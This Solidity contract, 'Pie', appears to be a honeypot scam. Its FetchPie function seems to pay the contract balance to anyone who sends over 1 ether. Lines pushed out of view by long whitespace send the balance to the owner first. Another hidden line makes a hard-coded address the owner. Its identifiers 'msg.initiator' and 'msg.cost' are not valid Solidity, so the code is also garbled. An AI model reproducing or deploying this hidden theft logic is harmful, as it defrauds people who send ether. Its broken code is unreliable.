// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Pie
{
    address public Owner = msg.initiator;

    function()
    public
    payable
    {

    }

    function FetchPie()
    public
    payable
    {
        if(msg.cost>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Owner.transfer(this.balance);
            msg.initiator.transfer(this.balance);
        }
    }

    function redeemTokens()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.initiator==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.initiator == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes details)
    payable
    public
    {
        require(msg.initiator == Owner);
        adr.call.cost(msg.cost)(details);
    }
}